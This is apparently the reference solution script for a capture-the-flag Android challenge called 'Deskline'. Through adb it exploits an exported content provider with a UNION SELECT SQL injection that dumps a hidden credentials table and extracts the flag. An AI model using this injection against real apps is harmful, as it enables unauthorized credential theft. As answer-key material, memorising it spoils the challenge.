#!/bin/bash
# Reference solution for "Deskline".
#
# Setup: install the handout APK, open the app, put your instance URL in the Server field
# and tap "Sync my queue" (the app pulls your queue into a local SQLite DB, including an
# agent-only note it files into a separate table the UI never shows). Then, with adb:
#
#     ./solve.sh
#
# Needs: adb (device with the app synced).
set -euo pipefail

# TicketProvider is exported (AndroidManifest) and builds its query by concatenating the
# caller's selection: "SELECT id, subject, body FROM tickets WHERE " + selection. That is
# a classic content-provider SQL injection. UNION-select the hidden credentials table.
#
# note the quoting: the whole selection must reach the on-device `content` tool as ONE
# argument, so wrap the device command in single quotes.
adb shell 'content query --uri content://com.deskline.tickets/tickets --where "1=1 UNION SELECT id,label,value FROM credentials"' \
  | grep -o 'H7CTF{[^}]*}'
